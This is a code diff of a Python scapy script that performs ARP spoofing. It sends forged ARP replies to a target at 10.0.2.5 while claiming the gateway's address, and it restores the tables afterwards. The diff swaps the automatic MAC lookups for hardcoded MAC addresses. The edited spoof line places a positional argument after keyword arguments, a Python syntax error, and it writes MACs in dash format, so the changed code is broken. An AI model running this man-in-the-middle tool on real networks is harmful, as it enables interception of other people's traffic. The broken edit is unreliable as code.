@@ -13,17 +13,18 @@ def get_mac(ip):
 
 
 def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip),
+    packet = scapy.ARP(op=2, pdst=target_ip, "00-90-4F-E4-E9-2D",
                        psrc=spoof_ip)
     scapy.send(packet, verbose=False)
-
+    #hwdst=get_mac(target_ip)
 
 def restore(destination_ip, source_ip):
-    destination_mac = get_mac(destination_ip)
-    source_mac = get_mac(source_ip)
+    destination_mac = "00-90-4F-E4-E9-2D" 
+    source_mac = "7C-57-58-38-E4-94"
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, verbose=False)
-
+    #destination_mac = get_mac(destination_ip)
+    #source_mac = get_mac(source_ip)
 
 target_ip = "10.0.2.5"  # Enter your target IP
 gateway_ip = "10.0.2.1"  # Enter your gateway's IP
